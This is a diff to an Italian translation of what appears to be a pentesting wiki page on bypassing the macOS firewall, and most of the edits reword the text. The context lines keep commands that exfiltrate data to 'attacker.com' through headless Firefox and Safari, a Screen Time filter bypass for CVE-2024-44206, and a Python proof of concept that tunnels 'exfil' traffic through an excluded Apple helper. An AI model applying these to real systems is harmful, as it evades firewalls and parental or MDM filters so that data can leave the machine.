@@ -32,13 +32,13 @@ Conoscere il traffico consentito ti aiuterà a identificare i domini potenzialme
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Abusare del DNS
+### Abusing DNS
 
-Le risoluzioni DNS vengono effettuate tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.
+Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Tramite app del browser
+### Via Browser apps
 
 - **oascript**
 ```applescript
@@ -61,7 +61,7 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Via processi di iniezione
+### Iniezioni di processi
 
 Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:
 
@@ -75,10 +75,10 @@ macos-proces-abuse/
 ## Vulnerabilità recenti di bypass del firewall di macOS (2023-2025)
 
 ### Bypass del filtro dei contenuti web (Screen Time) – **CVE-2024-44206**
-Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che ha interrotto il “filtro dei contenuti web” a livello di sistema utilizzato dai controlli parentali di Screen Time.
+Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che ha compromesso il “filtro dei contenuti web” a livello di sistema utilizzato dai controlli parentali di Screen Time.
 Un URI appositamente creato (ad esempio, con “://” codificato due volte) non è riconosciuto dall'ACL di Screen Time ma è accettato da WebKit, quindi la richiesta viene inviata senza filtri. Qualsiasi processo che può aprire un URL (incluso codice sandboxed o non firmato) può quindi raggiungere domini che sono esplicitamente bloccati dall'utente o da un profilo MDM.
 
-Test pratico (sistema non aggiornato):
+Test pratico (sistema non patchato):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
@@ -96,7 +96,7 @@ sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 Prima di macOS 11.2, la **`ContentFilterExclusionList`** consentiva a ~50 binari Apple come **`nsurlsessiond`** e l'App Store di bypassare tutti i firewall a filtro socket implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
 Il malware poteva semplicemente avviare un processo escluso—o iniettare codice in esso—e tunnelare il proprio traffico attraverso il socket già consentito. Apple ha completamente rimosso l'elenco di esclusione in macOS 11.2, ma la tecnica è ancora rilevante su sistemi che non possono essere aggiornati.
 
-Esempio di prova di concetto (pre-11.2):
+Esempio di proof-of-concept (pre-11.2):
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -113,7 +113,7 @@ s.send(b"exfil...")
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Enumera i binari che già possiedono il diritto *outgoing-network* (utile per il piggy-backing):
+2. Enumera i binari che già possiedono il diritto *outgoing-network* (utile per piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
